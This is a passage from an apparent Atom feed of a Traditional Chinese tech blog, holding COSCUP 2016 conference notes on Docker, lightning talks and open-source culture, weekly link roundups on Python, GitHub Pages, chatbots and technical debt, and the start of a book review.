&lt;li&gt;Galera Cluster for MySQL is  a true Multimaster Cluster based on synchronous replication. Galera Cluster is an easy-to-use, high-availability solution, which provides high system uptime, no data loss and scalability for future growth.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Docker-compose 用 cluster 的時候要注意 depends-on 的順序  &lt;/li&gt;
&lt;li&gt;Azure 西歐的機房在荷蘭  &lt;/li&gt;
&lt;li&gt;DB 要設定 volumes 才能永久儲存資料，否則 container 一關掉，DB 的資料也會不見。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.katacoda.com/philipz/courses/swarm/1"&gt;Docker 1.12 Swarm 和 MySQL Cluster &amp;amp; WordPress&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Docker Swarm  &lt;ul&gt;
&lt;li&gt;Managers (Raft consensus group), Workers (Gossip Network), gRPC  &lt;/li&gt;
&lt;li&gt;Mesh Network  &lt;/li&gt;
&lt;li&gt;會眾反應：之前有遇過用 Docker Swarm 然後出問題，用了 swarm left 然後把 node 砍掉，再把 Docker 相關的東西全部移除，之後重裝 Docker 和 Docker Swarm，發現設定檔仍舊是出問題的那個，並沒有被重裝，所以想請問 Managers 的設定檔到底是存在實體機器的哪裡？（A：不知道，可能要去看 Source code，也可以去 Docker 的 github 發個 issue 反應一下。）  &lt;/li&gt;
&lt;li&gt;Manager 數量建議為三台以上，原因請見&lt;a href="http://www.twword.com/wiki/%E6%8B%9C%E5%8D%A0%E5%BA%AD%E5%B0%87%E8%BB%8D%E5%95%8F%E9%A1%8C"&gt;拜占庭將軍問題&lt;/a&gt;，由 Leslie Lamport 所提出。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href="https://www.katacoda.com/philipz/scenarios/8"&gt;Serverless 架構 &amp;amp; Docker (DockerCon 2016 Hackathon 作品)&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;nvidia-docker run -it --rm -p 8888:8888 tensorflow/tensorflow:nightly-gpu&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nvidia-docker 會幫你把 GPU 掛載到 docker 裏面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;有獎徵答  &lt;ul&gt;
&lt;li&gt;Docker Network 在 Docker 1.9.0 以後出現  &lt;/li&gt;
&lt;li&gt;Docker Swarm 的 Worker 是在 Docker 1.12 以後出現的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這場 workshop 的內容個人覺得算蠻充實的，&lt;br /&gt;
（好像滿多沒聽過 Docker 的新手跑來聽，結果跟不上就中途離席了 XD）&lt;br /&gt;
我也差點跟不太上，畢竟跟 Docker 還沒有到很熟...  &lt;/p&gt;
&lt;p&gt;講者的簡報內容都是公開的，&lt;br /&gt;
覺得這種作法還挺不錯的，&lt;br /&gt;
有興趣的人點選上面的連結自己閱讀就行了。  &lt;/p&gt;
&lt;p&gt;因為講者是 O'REILLY 的 《Docker 錦囊妙計》的譯者，&lt;br /&gt;
所以現場贈送五本，&lt;br /&gt;
因為題目挺簡單的，&lt;br /&gt;
所以就舉手拿了一本，&lt;br /&gt;
本來打算在天瓏攤位買的，&lt;br /&gt;
於是就賺到一本書了。&lt;br /&gt;
&lt;img alt="docker" src="/files/coscup-2016/docker.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;《寫出高性能的服務與應用。那些你沒想過的事！》 by 小傑&lt;/h2&gt;
&lt;p&gt;Docker workshop 結束後就跑來聽小傑學長的 talk，&lt;br /&gt;
發現 IRC 上好多人都說根本是在複習大學的 OS，&lt;br /&gt;
還有人說這是不是 Synology 的面試題目，&lt;br /&gt;
覺得大家好毒呀，&lt;br /&gt;
可能是我大學 OS 沒學好，&lt;br /&gt;
我覺得複習一下也挺不錯的。&lt;br /&gt;
但也可能是因為題目下的有點內容農場式，&lt;br /&gt;
結果大家發現內容不如預期吧？&lt;br /&gt;
果然標題還是下的腳踏實地一點比較好。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning talks&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;發現好多認識的人都上去講了，&lt;br /&gt;
但我好像還沒講過哪一場 Conf 的 Lightning talk，&lt;br /&gt;
也沒在 R0 給過 talk，&lt;br /&gt;
也許該找個機會解鎖成就一下。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因為沒有現場筆記，&lt;br /&gt;
所以就照記憶中的狀況紀錄一下吧，&lt;br /&gt;
不一定會照順序。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RS 的自幹 VR Pokemon GO  &lt;/li&gt;
&lt;li&gt;tnlin 的 PokemonGo-TSP  &lt;/li&gt;
&lt;li&gt;Denny 的瘋狂走路瘦身法  &lt;/li&gt;
&lt;li&gt;Pellaeon 的臺灣程式路跑  &lt;/li&gt;
&lt;li&gt;蒼時的爸媽都認不得的 Ruby  &lt;/li&gt;
&lt;li&gt;中國來的會眾找人幫忙把 RMS 的 《Free Software, Free Society》中文化  &lt;ul&gt;
&lt;li&gt;想到我這本買了給 RMS 簽名，但只看一點點就沒看了，到現在還沒看完...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;兩分鐘打臉 MTK  &lt;ul&gt;
&lt;li&gt;覺得這個最猛，只改兩行 code 就讓 MTK 的 LinkIt Smart 7688 同時支援 AP mode 跟 client mode，根本充份顯示了企業的程式碼應該要開源的重要性，不然使用者遇到問題根本沒有機會自己改。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;V字龍的臺灣社群非官方客製版 Ubuntu 作業系統  &lt;ul&gt;
&lt;li&gt;覺得這個還蠻棒的耶，不然臺灣自由軟體的中文化這塊真的幾乎快要沒人弄了，而且還自己先修了一些還沒被 upstream merge 的 bug，雖然我現在沒在用 Ubuntu 了，這個真的蠻值得支持的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;pyclub - pycontw code sprint 的宣傳  &lt;/li&gt;
&lt;li&gt;交大丁戊組的工商服務  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;BoF&lt;/h2&gt;
&lt;p&gt;看到廠商攤位上有一張很神奇的履歷調查問卷，&lt;br /&gt;
Slack 跟 Trello 算在專業技能裏面。&lt;br /&gt;
&lt;img alt="resume" src="/files/coscup-2016/resume.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;然後依照慣例就是披薩跟可樂吃到飽。&lt;br /&gt;
&lt;img alt="pizza" src="/files/coscup-2016/pizza.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;跑去 CTLUG x openSUSE x RailsFun，&lt;br /&gt;
看到了有點久沒看到的 JC，&lt;br /&gt;
還從他那邊拿到了很有趣的自製木牌避邪符，&lt;br /&gt;
真的是目前遇過亂點技能樹最強的傢伙。&lt;br /&gt;
&lt;img alt="amulet" src="/files/coscup-2016/amulet.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;之後就和小趴還有喜德去各個 BoF 亂晃，&lt;br /&gt;
然後臨時和雨蒼還有其他幾個人臨時組一個 Pokemon GO BoF，&lt;br /&gt;
跑去外面抓呆呆獸（被它逃走了QQ）、電擊獸、迷你龍  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Day 2: 2016/08/21 Sun&lt;/h1&gt;
&lt;h2&gt;用 JS 自幹（鋼鐵人電影裡頭的）Jarvis by 李慕約&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://sheethub.github.io/smartcity2016/map/map2.5d.html"&gt;https://sheethub.github.io/smartcity2016/map/map2.5d.html&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;應該是用 &lt;a href="https://cloud.google.com/speech/"&gt;GCP 的 Speech API&lt;/a&gt;?  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Heilmeier Questions  &lt;ul&gt;
&lt;li&gt;是這個？ &lt;a href="http://www.design.caltech.edu/erik/Misc/Heilmeier_Questions.html"&gt;http://www.design.caltech.edu/erik/Misc/Heilmeier_Questions.html&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Debater 辯論家：網路筆戰大亂鬥 by ETBlue&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ETBlue/debater"&gt;https://github.com/ETBlue/debater&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Related links  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/ETBlue/gw2inventory"&gt;https://github.com/ETBlue/gw2inventory&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;開放公司文化之下的軟體開發 / 如何用開源軟體賺錢？ by 翟本喬&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;「要怎麼解決這個問題呢?」 政府：「辦一個比賽。」  &lt;ul&gt;
&lt;li&gt;笑著笑著就哭了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;「還好我們沒有中華民國奧林匹克開源軟體協會。」  &lt;/li&gt;
&lt;li&gt;LibreOffice  &lt;/li&gt;
&lt;li&gt;ownCloud  &lt;/li&gt;
&lt;li&gt;S3QL  &lt;/li&gt;
&lt;li&gt;和沛如何用開源軟體？  &lt;ul&gt;
&lt;li&gt;觀察客戶要什麼  &lt;/li&gt;
&lt;li&gt;加上重要功能  &lt;/li&gt;
&lt;li&gt;願意自己重寫  &lt;/li&gt;
&lt;li&gt;甚至徹底改變商業模式  &lt;/li&gt;
&lt;li&gt;建置世界級的大系統  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;找到使用者的痛，並解決它。  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;真的覺得應該要一直強調一點：&lt;br /&gt;
參與開源軟體真的不能只停留在使用者&lt;br /&gt;
要讓每一位參與者都要有自己的貢獻是不可或缺的自覺&lt;br /&gt;
不一定只侷限在寫程式&lt;br /&gt;
不管是工作人員、翻譯或是其他跟 Open Source 有關的活動都是需要的&lt;br /&gt;
真的不能只停留在一年參加一次 Conf 看人家演講&lt;br /&gt;
每一個人都可以讓臺灣在 Open Source 界被其他國家看見  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning talks&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;othree: 用 git 線圖來畫臺北捷運路網  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/othree/taipei-mrt"&gt;https://github.com/othree/taipei-mrt&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;用完以後我更懂 git branch 跟 git log 了  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;jackymaxj: HackMD  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://hackmd.io/p/HyTkWyJF#/"&gt;https://hackmd.io/p/HyTkWyJF#/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://hackmd.io/"&gt;https://hackmd.io/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;海豹：SITCON HK  &lt;ul&gt;
&lt;li&gt;今年十月  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;徵音梅林新歌發表 - YChao  &lt;ul&gt;
&lt;li&gt;三天三夜！  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;三分鐘送 first kernel patch - louielu  &lt;/li&gt;
&lt;li&gt;報到 App 的開發秘辛 - Denny Huang  &lt;/li&gt;
&lt;li&gt;Chinese Character - DaeHyun Sung  &lt;ul&gt;
&lt;li&gt;韓國講者  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://telegram.me/cjkvBot"&gt;https://telegram.me/cjkvBot&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;感覺好猛啊，reference 裡頭竟然有 O'REILLY 的 CJKV 的書，我也是前陣子幫 Pellaeon 拿書才發現 O'REILLY 竟然有出關於字型編碼的書，而且超大一本，內容涵蓋中文(C)、日文(J)、韓文(K)、越南文(V)。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Thoughts&lt;/h2&gt;
&lt;p&gt;不知道是因為開始工作了以後心境轉變了還是其他原因，&lt;br /&gt;
今年參加 Conf 沒有像以前聽那麼多議程了，&lt;br /&gt;
也沒有開 IRC、沒開共筆。&lt;br /&gt;
已經變成像以前社群長輩那樣，&lt;br /&gt;
參加 Conf 比較像是為了見見一陣子沒看到的朋友，&lt;br /&gt;
聊聊天、彼此交換一下資訊還有近況等等&lt;br /&gt;
也不知道是不是個好現象就是。  &lt;/p&gt;
&lt;p&gt;其實有想過，&lt;br /&gt;
如果有真的想聽的議程沒聽到的話，&lt;br /&gt;
還是可以會後自己去看錄影和簡報，&lt;br /&gt;
（甚至拿來在工作的時候聽也 OK，&lt;br /&gt;
畢竟現在工作的時候就會順便聽 Podcast 了。）&lt;br /&gt;
大概只有 HITCON 有些不願意公開錄影和簡報的需要當場聽。  &lt;/p&gt;
&lt;p&gt;然後現在都會儘量挑標題看起來比較不那麼浮誇和技術成份看起來比較多的 talk，&lt;br /&gt;
往往內容比較紮實，&lt;br /&gt;
而且人也比較少，&lt;br /&gt;
不會沒地方坐。&lt;br /&gt;
一開始來參加 Conf 的時候因為聽不太懂，&lt;br /&gt;
所以都會挑比較有表演性質或嘴炮的 talk 聽，&lt;br /&gt;
畢竟太難的就聽不懂了，&lt;br /&gt;
我想這是比較明顯的差別吧。  &lt;/p&gt;
&lt;p&gt;今年參加的時候不知道為何，&lt;br /&gt;
一直有種 COSCUP 2015 恍若昨日的感覺，&lt;br /&gt;
不知道是不是因為這一年過的不夠充實。&lt;br /&gt;
其實開始工作以後，&lt;br /&gt;
一直覺得工作比待在學校還輕鬆，&lt;br /&gt;
不知道是自己鬆懈了，&lt;br /&gt;
還是工作內容的問題，&lt;br /&gt;
我想這是自己下半年要調整的方向吧。  &lt;/p&gt;
&lt;p&gt;然後希望從今年開始，&lt;br /&gt;
以後參加 COSCUP 都跟這次一樣要拿開源貢獻者的票，&lt;br /&gt;
其實之前有想過，&lt;br /&gt;
以後參加 Conf 要不要都給自己設下一定要投稿甚至當講者才能去的規則，&lt;br /&gt;
我想就拿這個目標努力吧。  &lt;/p&gt;</summary><category term="COSCUP"></category></entry><entry><title>Y2016W33</title><link href="https://blog.m157q.tw/posts/2016/08/22/y2016w33/" rel="alternate"></link><published>2016-10-29T09:31:15+08:00</published><updated>2016-10-29T09:31:15+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-08-22:posts/2016/08/22/y2016w33/</id><summary type="html">&lt;h3&gt;Blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://medium.com/@mosky/%E8%BD%89%E7%9C%BC-24-%E5%B9%B4-ef021a692028#.1cs5ikyxf"&gt;轉眼、24 年 — Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Mosky 的程式回憶路啊，原來跟我同年呀，看看人家，再看看我自己，只能繼續加油了 QQ  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/blog/2228-simpler-github-pages-publishing"&gt;Simpler GitHub Pages publishing&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;GitHub 把 GitHub Pages 的使用方式再簡化了一些，然後多了一些彈性。  &lt;/li&gt;
&lt;li&gt;原本非 &lt;code&gt;username.github.io&lt;/code&gt; 的 repo 只能用 &lt;code&gt;gh-pages&lt;/code&gt; 這個 branch 給 GitHub Pages 使用  &lt;ul&gt;
&lt;li&gt;但現在可以指定要直接使用 &lt;code&gt;master&lt;/code&gt; branch 給 GitHub Pages 使用  &lt;/li&gt;
&lt;li&gt;或是使用 &lt;code&gt;master&lt;/code&gt; branch 底下的 &lt;code&gt;docs/&lt;/code&gt; 資料夾給 GitHub Pages 使用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但我比較好奇的是放在 &lt;code&gt;docs/&lt;/code&gt; 底下真的能夠同時兼顧靜態網頁跟給人看的 readme 的格式嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://glyph.twistedmatrix.com/2016/08/python-packaging.html"&gt;Deciphering Glyph :: Python Packaging Is Good Now&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;講了一下 Python Packaging 方面的一些歷史  &lt;/li&gt;
&lt;li&gt;2004 &lt;code&gt;setuptools&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;2005 &lt;code&gt;easy_install&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;但 &lt;code&gt;easy_install&lt;/code&gt; 其實不好用，所以有人出來弄了 &lt;code&gt;wheel&lt;/code&gt; format, &lt;code&gt;pip&lt;/code&gt;, &lt;code&gt;pypi&lt;/code&gt;  &lt;blockquote&gt;
&lt;p&gt;pip 跟 pypi 真的算是救星啊...  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Wikipedia"></category><category term="Python"></category><category term="Github"></category><category term="Misc"></category><category term="Blog"></category></entry><entry><title>Y2016W32</title><link href="https://blog.m157q.tw/posts/2016/08/15/y2016w32/" rel="alternate"></link><published>2016-10-29T09:07:40+08:00</published><updated>2016-10-29T09:07:40+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-08-15:posts/2016/08/15/y2016w32/</id><summary type="html">&lt;h3&gt;Github&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/rlabbe/Kalman-and-Bayesian-Filters-in-Python"&gt;rlabbe/Kalman-and-Bayesian-Filters-in-Python: Kalman Filter book using Jupy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Python 程式碼直接講解 Kalman and Bayesian Filtlers  &lt;/li&gt;
&lt;li&gt;現在還滿多這種出了書以後，把程式碼放到 GitHub 上讓讀者搭配閱讀的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Golang&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/shazow/ssh-chat"&gt;shazow/ssh-chat: Chat over SSH.&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用 Golang 自己架一個可以直接用 ssh 聊天的 server  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Learning&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://mp.weixin.qq.com/s?__biz=MzAxNjIzMzU5NQ%3D%3D&amp;amp;mid=2649477326&amp;amp;idx=1&amp;amp;sn=c7e6f5534e4acb4720b0d36cc4d606c2&amp;amp;scene=1&amp;amp;srcid=0807l2IocSJLUwwJiKSoFCNz&amp;amp;key=8dcebf9e179c9f3a41236227750c6715a7e059e6081351047d015c8ded23436f514c77bf232e40c49af65c75dc8e6e45&amp;amp;ascene=0&amp;amp;uin=MTk3NDExNzA0Mg%3D%3D&amp;amp;devicetype=iMac+MacBookPro11,5+OSX+OSX+10.10.5+build(14F1909)&amp;amp;version=11020201&amp;amp;pass_ticket=2C4DQqwN/gRBPAdYHGWYsu6GU08QODDmT/rTeQGDAQxRtVCaCxXSbFcbV3XMjMN1&amp;amp;utm_content=buffer31230&amp;amp;utm_medium=social&amp;amp;utm_source=twitter.com&amp;amp;utm_campaign=buffer"&gt;進入職場後，如何高效地讀書？&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;功利一些，未嘗不可  &lt;ul&gt;
&lt;li&gt;是的，怎樣的讀書方式才是最有效的？我覺得一定是當你遇到某個迫切的問題的時候。怎樣的讀書方式是最無效、最容易讓人繼續讀下去的？我覺得應該是漫無目的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;學習某個領域時，多讀幾本書  &lt;ul&gt;
&lt;li&gt;如果我覺得某個方面是有必要瞭解學習，我至少會看十本同類書籍，然後仔細想想那些專家的看法是否一致，慢慢得出我在這個領域的思考框架。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;沒時間讀怎麼辦？  &lt;ul&gt;
&lt;li&gt;讀書，要以自己為主體  &lt;ul&gt;
&lt;li&gt;以學習者為主體的閱讀，不太關心看不懂和記不住的問題，只關心能不能夠通過閱讀提升自己的能力，帶來行為的改變。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;讀書，不必讀完，讀對你有用的那部分即可  &lt;ul&gt;
&lt;li&gt;我們需要做的是，在一本書中，找到對我們有幫助的那部分，並認真讀，而不是一字不落的讀。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;掌握核心方法  &lt;ul&gt;
&lt;li&gt;反思+應用  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;不能只是接受書上的資訊，&lt;br /&gt;
把這些資訊集合起來好好思考並做出結論，&lt;br /&gt;
從而內化成自己的知識才是最重要的呀  &lt;/p&gt;</summary><category term="Learning"></category><category term="Golang"></category><category term="Github"></category></entry><entry><title>Y2016W31</title><link href="https://blog.m157q.tw/posts/2016/08/08/y2016w31/" rel="alternate"></link><published>2016-10-14T16:31:15+08:00</published><updated>2016-10-14T16:31:15+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-08-08:posts/2016/08/08/y2016w31/</id><summary type="html">&lt;h3&gt;Facebook (Messenger Bot)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://manychat.com/"&gt;ManyChat – The easiest way to create Facebook Messenger bot&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;好像還不錯的感覺，但沒有實際使用過就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://chatfuel.com/"&gt;Create a Facebook AI Chatbot Without Coding&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;(2016-10-14 補充)  &lt;/li&gt;
&lt;li&gt;這個是公司最近開始使用的，真的不需要寫程式碼。  &lt;/li&gt;
&lt;li&gt;只要開 Facebook 的粉絲專頁，其他都用他的 dashboard 設定就行。  &lt;/li&gt;
&lt;li&gt;個人覺得能寫出這樣的服務還滿厲害的&amp;gt;  &lt;/li&gt;
&lt;li&gt;基本上用了這個以後，每個人大概都可以有一個自己的 bot，感覺之後真的是 Bot 滿天飛的時代了。  &lt;/li&gt;
&lt;li&gt;這服務本身也有些 plugin 可以使用，可以紀錄在特定事件時，使用者回覆的訊息，並在之後拿來使用。  &lt;ul&gt;
&lt;li&gt;Broadcast 訊息可以發給回覆過特定問題的使用者  &lt;/li&gt;
&lt;li&gt;可以接受 RSS feed 或是 JSON API 的網址，所以可以自己寫 API 客製化訊息，讓自己的 bot 去讀取。  &lt;/li&gt;
&lt;li&gt;之後預計會支援不同地區的 Payments  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Software engineering&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://teddy-chen-tw.blogspot.tw/2016/08/blog-post_4.html"&gt;搞笑談軟工: 技術債要不要還？&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;老實說以敏捷開發、市場導向和商業利益考量來說，一定是以快速開發能用為主就好，所以對於技術債這塊就沒那麼重視。  &lt;/li&gt;
&lt;li&gt;後來覺得剛開始一定會有技術債，但在沒那麼忙的時候就要開始還，跟平常貸款一樣，先貸款以後，邊賺邊還的感覺。  &lt;/li&gt;
&lt;li&gt;如果要累積到很久才一次還的話，一定會覺得還不出來。  &lt;/li&gt;
&lt;li&gt;而且個人覺得一開始就想寫出沒有技術債的程式碼，難度有點太高。  &lt;ul&gt;
&lt;li&gt;一來是要花時間去考慮架構的彈性、程式碼的可維護性。  &lt;/li&gt;
&lt;li&gt;二來是專案剛起步的階段，需求一定會有很頻繁的變動，花了很多時間寫出比較沒有技術債的程式碼，很可能因為需求的更改，馬上棄用。不只自己覺得很幹，還會讓客戶或老闆覺得你寫程式怎麼寫的這麼慢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但現實是，很多人寫了充滿技術債的程式碼以後就忘了還債了，然後大概就是離職後，下一個接手的人開始還債，一個債留公司的概念。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Pokemon GO&lt;/h3&gt;
&lt;p&gt;2016/08/06 Pokemon GO 在臺灣正式開放，&lt;br /&gt;
也跟著玩了一下，&lt;br /&gt;
所以查了些資料。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pokeassistant.com/main/contribute"&gt;Home - Poke Assistant&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.e-zone.com.hk/channelnews.php?id=17055"&gt;Pokemon Go 追蹤精靈 6 大地圖 【合集】死掉也不怕總有一款用得 – PokemonGo – 小精靈地圖 – 阿美 – ezone.hk -&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.gameapps.hk/news/16808"&gt;《POKEMON：GO》道館爭奪戰詳盡解構！ - GameApps.hk&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://rios.co/it/2016/07/29/pokemon-go-%E9%81%93%E9%A4%A8%E6%88%B0%E6%95%99%E5%AD%B8/"&gt;Pokemon Go 道館戰教學 | rios's IT Conception&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.pokemonradargo.com/#"&gt;Poke Radar for Pokemon GO - Maps, Finder, Search, Locations&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.weekendhk.com/lifestyle/pokemon-go-cp%e5%80%bc-%e6%94%bb%e7%95%a5/3/"&gt;Pokémon Go CP 值 效果 3 大揭密！進階訓練員必讀！ | 生活 | 新假期&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Gossiping/M.1469889541.A.032.html"&gt;[ＦＢ] 明信片奔台大賽 - 看板 Gossiping - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從國外寄三張明信片回臺灣，一張寫 Taiwan、一張寫 Formosa、一張寫 R.O.C.。結果寫 Taiwan 跟 Formosa 的兩張都寄得回臺灣，R.O.C. 那張卻沒收到。挺有趣的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Pokemon GO"></category><category term="Ptt"></category><category term="Wikipedia"></category><category term="Software engineering"></category><category term="Facebook"></category><category term="Messenger Bot"></category></entry><entry><title>《蟬堡：全世界我們最可憐》</title><link href="https://blog.m157q.tw/posts/2016/08/02/%E8%9F%AC%E5%A0%A1-%E5%85%A8%E4%B8%96%E7%95%8C%E6%88%91%E5%80%91%E6%9C%80%E5%8F%AF%E6%86%90/" rel="alternate"></link><published>2016-08-02T05:37:23+08:00</published><updated>2016-08-02T05:37:23+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-08-02:posts/2016/08/02/蟬堡-全世界我們最可憐/</id><summary type="html">&lt;p&gt;&lt;img alt="封面" src="/files/蟬堡-全世界我們最可憐/cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;&lt;a href="/posts/2016/07/14/蟬堡-沒有夢的小鎮/"&gt;《蟬堡：沒有夢的小鎮》&lt;/a&gt; 的續集，&lt;br /&gt;
主要就是在說明 Dr.Hydra 的 Mr.Game 人格和會下蠱的蠱佬人格怎麼來的，&lt;br /&gt;
然後為蟬堡三部曲第三集蟬堡的出現做鋪陳吧。  &lt;/p&gt;
&lt;p&gt;2016/07/20 就看完這本了，&lt;br /&gt;
現在回想一下好像沒有啥覺得比較值得紀錄的橋段，&lt;br /&gt;
所以就不特別紀錄了。&lt;br /&gt;
印象比較深刻的是綠石鎮的角色在那邊人格大風吹的時候，&lt;br /&gt;
每翻一頁都有新的圖來輔助說明，&lt;br /&gt;
不然根本看不懂內容在講什麼鬼 XDDD  &lt;/p&gt;
&lt;p&gt;看到最後真的好好奇，&lt;br /&gt;
到底誰是小恩雅？&lt;br /&gt;
誰是黑屌刺客？&lt;br /&gt;
